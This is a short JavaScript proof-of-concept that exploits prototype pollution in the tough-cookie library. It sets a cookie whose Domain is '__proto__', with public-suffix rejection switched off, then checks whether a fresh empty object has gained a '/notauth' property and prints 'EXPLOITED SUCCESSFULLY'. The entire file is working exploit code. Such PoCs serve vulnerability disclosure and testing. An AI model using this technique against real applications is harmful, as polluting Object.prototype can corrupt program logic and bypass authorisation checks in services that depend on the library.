const tough = require("tough-cookie");

const jar = new tough.CookieJar(undefined, {
    rejectPublicSuffixes: false
  });

  jar.setCookieSync(
    "Slonser=polluted; Domain=__proto__; Path=/notauth",
    "https://__proto__/admin"
  );

const object = {};

if (object["/notauth"]) {
    console.error("EXPLOITED SUCCESSFULLY")
} else {
    console.log("EXPLOIT FAILED");
}